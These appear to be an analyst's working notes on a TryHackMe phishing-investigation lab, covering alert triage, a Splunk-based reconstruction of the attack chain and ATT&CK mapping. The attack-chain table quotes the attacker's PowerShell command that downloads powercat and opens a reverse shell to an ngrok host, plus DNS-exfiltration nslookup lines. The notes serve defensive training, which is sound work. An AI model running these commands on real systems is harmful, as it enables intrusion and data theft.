# Working notes: TryHackMe SOC Sim, Phishing Unfolding (started 2026-11-16)

Medium, ~40 min. A live phishing attack that unfolds across the corporate network; goal is to piece together the full attack chain and report it.

## Scenario objectives (from dashboard)
- Monitor and analyse real-time alerts as the attack unfolds
- Identify and document PowerShell executions, reverse shell connections, suspicious DNS requests
- Write case reports covering the full scope of the breach
- Alert categories shown: Phishing, Process, Execution

## Alerts worked
<!-- one section per alert: ID, rule, severity, key fields, queries run, verdict -->

### 1003: Suspicious email from external domain (Low, Phishing)
Screenshot: assets/screenshots/thm-phishing-unfolding/02-alert-1003-details.jpg
- 22:29:18, inbound email
- sender `leonard@fashionindustrytrends.xyz` → recipient `yani.zubair@tryhatme.com`
- subject: "Grow Your Hat Business Overnight with this Secret Formula"
- content: get-rich-quick pitch, "just click"; **no URL in body, no attachment**
- Rule note from SOC Lead: rule fires on unusual TLDs and "still needs fine-tuning"
- Verdict: **False Positive** (submitted and closed). Unsolicited marketing spam, not phishing: no link, no attachment, no credential request, so there's no way for it to cause harm. Rule fired on the .xyz TLD alone (rule flagged by SOC Lead as needing tuning).
- Tuning idea: only alert on unusual TLDs when the email also contains a URL or attachment

### 1005: Suspicious Attachment found in email (Low, Phishing)
Screenshot: assets/screenshots/thm-phishing-unfolding/04-alert-1005-details.jpg
- 22:34:20, inbound email
- sender `john@hatmakereurope.xyz` → recipient `michael.ascot@tryhatme.com`
- subject: "FINAL NOTICE: Overdue Payment - Account Suspension Imminent"
- attachment: `ImportantInvoice-Febrary.zip` (note misspelling "Febrary")
- content: account 30 days past due, suspension today, legal action in 24h, "open the attached invoice immediately"
- Phishing indicators (my analysis):
  1. Urgency & fear in subject/body: "FINAL NOTICE", suspension today, legal action in 24h
  2. Typo in attachment name ("Febrary"), common in phishing
  3. .zip archive: hides the real file type from the user and from email attachment scanning; contents only run if the user extracts and opens them
  4. Unusual .xyz sender domain posing as a supplier ("hatmakereurope"), external to tryhatme.com
  5. Invoice dated "February" sent in November doesn't fit the story
  6. Generic "your account", no account number, invoice number or name
- Verdict: _pending; need to confirm in Splunk whether michael.ascot opened it_

#### Splunk search: `*febrary` (6h real-time) → 6 events
Screenshot: assets/screenshots/thm-phishing-unfolding/05-splunk-febrary-zip-saved.jpg
- 22:34:07 email delivered (datasource: email)
- 22:54:14 **Sysmon Event 11 (FileCreate)**: OUTLOOK.EXE (pid 8668) saved `ImportantInvoice-Febrary.zip` to `C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\`, plus `:Zone.Identifier` (Mark-of-the-Web)
- 22:54:25 **Sysmon Event 15 (FileCreateStreamHash)**: Explorer.EXE (pid 3180) extracted `...\Temp1_ImportantInvoice-Febrary.zip\ImportantInvoice-Febrary\invioce.pdf.lnk`
- Screenshot of .lnk extraction: assets/screenshots/thm-phishing-unfolding/06-splunk-lnk-extracted.jpg
- Host: **win-3450** (michael.ascot)
- **Key finding:** the "invoice" is `invioce.pdf.lnk`, a Windows **shortcut** disguised as a PDF (double extension + typo). LNK files can run commands (often PowerShell) when double-clicked
- User opened the zip ~20 min after delivery, 11s from save to extraction

### Queue context at 22:31
- 1000 Suspicious email from external domain (22:26), not yet reviewed
- 1001 / 1002 Suspicious Parent Child Relationship (Process, 22:28 / 22:31)

## Full queue overview (all 36 alerts in)
- Low: phishing "suspicious email from external domain" ×9 (1000, 1003 closed, 1004, 1011, 1013, 1014, 1017, 1018, 1035); parent-child ×~15 spread 22:28–23:00
- **1005 Suspicious Attachment found in email** (Low, 22:36): first email with an attachment
- **1020 PowerShell Script in Downloads Folder** (Low, 22:57)
- **1022 Network drive mapped to a local drive** (Medium, 22:59)
- **1024 Network drive disconnected** (Medium, 23:00)
- **1025–1034 Suspicious Parent Child Relationship ×10, all High, all 23:01**: a burst
- Hypothesis: attachment → user runs PowerShell from Downloads → maps a network share → burst of child processes (recon / reverse shell / DNS?)
- Triage plan: follow the chain in time order: 1005 → 1020 → 1022 → 1024 → 1025–1034; then clear the Low noise

## Attack chain (build as we go)
Source: `win-3450 powershell | sort _time | table _time process.name process.command_line` (73 events)
Screenshot: assets/screenshots/thm-phishing-unfolding/07-splunk-powershell-reverse-shell.jpg
NOTE: some nslookup subdomains contain base64-encoded flag text. Crop/redact before publishing screenshots.

| Time | Stage | Evidence |
|---|---|---|
| 22:34:07 | Initial access: phishing email | john@hatmakereurope.xyz → michael.ascot, ImportantInvoice-Febrary.zip |
| 22:54:14 | User opens attachment | OUTLOOK.EXE writes zip to INetCache (Sysmon 11) |
| 22:54:25 | Zip extracted | Explorer extracts invioce.pdf.lnk (Sysmon 15) |
| 22:54:26 | Execution: LNK → PowerShell | `powershell -c IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell` = **reverse shell** via powercat to ngrok tunnel |
| 22:54:42–22:55:11 | Discovery | systeminfo, whoami, whoami /priv, net user, net localgroup |
| 22:55:50 | Tool transfer: PowerView | powershell.exe (pid 9060) created `C:\\Users\\michael.ascot\\Downloads\\PowerView.ps1` (Sysmon 11), alert 1020 |
| 22:57:32 | Map file share | `net use Z: \\FILESRV-01\SSF-FinancialRecords` |
| 22:58:19 | Collection | `Robocopy . C:\Users\michael.ascot\downloads\exfiltration /E` |
| 22:58:30 | Cleanup | `net use Z: /delete` |
| 22:59:17–22:59:33 | Exfiltration over DNS | `powershell -ExecutionPolicy Bypass` + many `nslookup <base64-chunk>.haz4rdw4re.io` |
| 22:59:42 | Reverse shell relaunched | same powercat command again |

## Queries used

## End-of-session takeaway (fill in every time we stop)
- What I found:
- What it means for a SOC/IR role:

## Case study draft (Problem → Action → Outcome)
- Problem:
- Action:
- Outcome:

## My analysis of post-exploitation (before correction)
1. systeminfo = collected info about the system
2. whoami = shows the username, domain, groups and privileges of the account running the script
3. Located financial records, copied the directory and exfiltrated it

### Refined
- Discovery (T1082 systeminfo, T1033 whoami, whoami /priv = privilege check, T1087.001 net user, T1069.001 net localgroup)
- `net use Z:` maps the FILESRV-01 SSF-FinancialRecords share as a drive (T1021.002 SMB/Windows Admin Shares). It doesn't change permissions; it uses Michael's existing access
- Robocopy /E copies the whole share into a local "exfiltration" folder = staging (T1074.001 Local Data Staging, T1039 Data from Network Shared Drive)
- `net use Z: /delete` removes the mapping = cleanup (T1070 Indicator Removal)
- nslookup with base64 chunks as subdomains of haz4rdw4re.io = DNS exfiltration (T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol). Data leaves in DNS queries, which firewalls often allow

### 1020: PowerShell Script in Downloads Folder (Low, Execution): TRUE POSITIVE
Screenshot: assets/screenshots/thm-phishing-unfolding/09-alert-1020-details.jpg
- 22:55:50, win-3450, powershell.exe pid 9060 created C:\Users\michael.ascot\Downloads\PowerView.ps1 (Sysmon 11)
- PowerView = PowerSploit Active Directory recon tool. Attacker pulled it down over the reverse shell to enumerate the domain (T1105 Ingress Tool Transfer, T1087.002 Domain Account Discovery)
- Status of 1005: Closed (TP, escalated)
- 1020 closed (TP)

### 1022: Network drive mapped to a local drive (Medium): TRUE POSITIVE
Screenshot: assets/screenshots/thm-phishing-unfolding/10-alert-1022-details.jpg
- 22:57:45, win-3450, Sysmon 1 (Process Create)
- net.exe (pid 5784), parent **powershell.exe (pid 3728)**, working dir C:\Users\michael.ascot\downloads\
- `net use Z: \\FILESRV-01\SSF-FinancialRecords`
- Normal users map drives via Explorer/logon scripts; net.exe spawned from the reverse-shell PowerShell = attacker-driven
- 1022 closed (TP)

### 1024: Network drive disconnected (Medium): TRUE POSITIVE
Screenshot: assets/screenshots/thm-phishing-unfolding/11-alert-1024-details.jpg
- 22:58:43, win-3450, net.exe (pid 8004), parent powershell.exe (pid **3728**, same session as 1022)
- `net use Z: /delete`: removes the mapping after Robocopy staging (22:58:19) = cleanup (T1070)
- 1024 closed (TP)

### 1025: Suspicious Parent Child Relationship (High): TRUE POSITIVE (DNS exfil)
Screenshot: assets/screenshots/thm-phishing-unfolding/12-alert-1025-dns-exfil.jpg (this chunk is a zip header, not a flag, so it's safe to publish)
- 22:59:30, win-3450, nslookup.exe (pid 5520), parent powershell.exe **3728**
- working dir: C:\Users\michael.ascot\downloads\exfiltration\
- `nslookup UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io`
- Base64 "UEsDBBQ..." decodes to `PK\x03\x04`, the **ZIP file signature**. The attacker zipped the staged files and is sending the archive out in DNS-query-sized chunks
- 1025–1034 closed together (TP) with one shared report; verified afterward:

### Bulk verification of 1025–1034
Query: `win-3450 nslookup | sort _time | table _time process.pid process.parent.pid process.command_line`
Screenshot: assets/screenshots/thm-phishing-unfolding/13-splunk-dns-exfil-bulk-verify.jpg (shows top 7 rows only. Bottom 2 rows contain encoded flag text and are NOT in the screenshot)
- Exactly **10 nslookup processes** (PIDs 4752, 5696, 5704, 6604, 3800, 5432, 3952, 5520, 3648, 3700) = 10 High alerts
- **All 10 have parent PID 3728**, all query *.haz4rdw4re.io, 22:59:17–22:59:33
- Interleaved `powershell -ExecutionPolicy Bypass` rows = the exfil script's PowerShell processes
- Conclusion: bulk TP closure was correct; no outlier hidden in the burst

### 1001: Suspicious Parent Child (Low): FALSE POSITIVE
Screenshot: assets/screenshots/thm-phishing-unfolding/14-alert-1001-benign-example.jpg
- 22:26:36 (before the phishing email was even opened), win-3459
- services.exe (3506) → TrustedInstaller.exe (3577), C:\Windows\servicing\TrustedInstaller.exe, cwd C:\Windows\system32\
- Windows Modules Installer (Windows Update), legit path, legit parent
- 1000, 1001, 1002 closed

### 1006: Suspicious Parent Child (Low) on win-3450: FALSE POSITIVE (judgment call)
Screenshot: assets/screenshots/thm-phishing-unfolding/15-alert-1006-win3450-benign.jpg
- 22:35:32, **win-3450** (the compromised host), svchost.exe (3855) → rdpclip.exe (3587), C:\Windows\system32\
- rdpclip = RDP clipboard helper; svchost is its normal parent
- Occurred ~19 min BEFORE the attachment was opened (22:54:14); parent is not 3728 / not in attacker process tree
- Host match alone ≠ malicious. Normal pair + legit path + pre-compromise timing → benign
- Real-world follow-up: confirm the RDP session belonged to michael.ascot (logon type 10 events)

### 1023: Suspicious Parent Child (Low): TRUE POSITIVE (data staging)
Screenshot: assets/screenshots/thm-phishing-unfolding/16-alert-1023-robocopy-staging.jpg
- 22:58:32, win-3450, powershell.exe (**3728**) → Robocopy.exe (8356)
- `Robocopy . C:\Users\michael.ascot\downloads\exfiltration /E`, working dir **Z:\** (= mapped FILESRV-01\SSF-FinancialRecords)
- Copies the whole financial share (incl. subfolders, /E) into local staging folder (T1039, T1074.001)
- Rated Low by the rule but is the core data-theft collection step
